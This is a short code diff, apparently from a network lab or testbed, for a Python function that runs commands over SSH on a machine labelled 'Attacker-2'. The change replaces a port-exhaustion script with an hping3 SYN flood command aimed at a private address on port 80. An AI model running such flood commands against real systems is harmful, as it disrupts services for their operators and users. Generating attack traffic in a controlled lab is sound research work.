@@ -19,10 +19,10 @@ def execute_ssh_commands():
     
     # Specify the commands to run on the remote machine (Attacker-2)
     remote_commands = [
-        "nohup conda deactivate &",
-        "nohup /root/port-exahust.sh &"
+        "nohup hping3 -S --flood -V -p 80 10.0.0.1 > /dev/null 2>&1 &"
     ]
-    
+
+   
     # Execute the remote commands on Attacker-2 machine
     for command in remote_commands:
         stdin, stdout, stderr = ssh.exec_command(command)
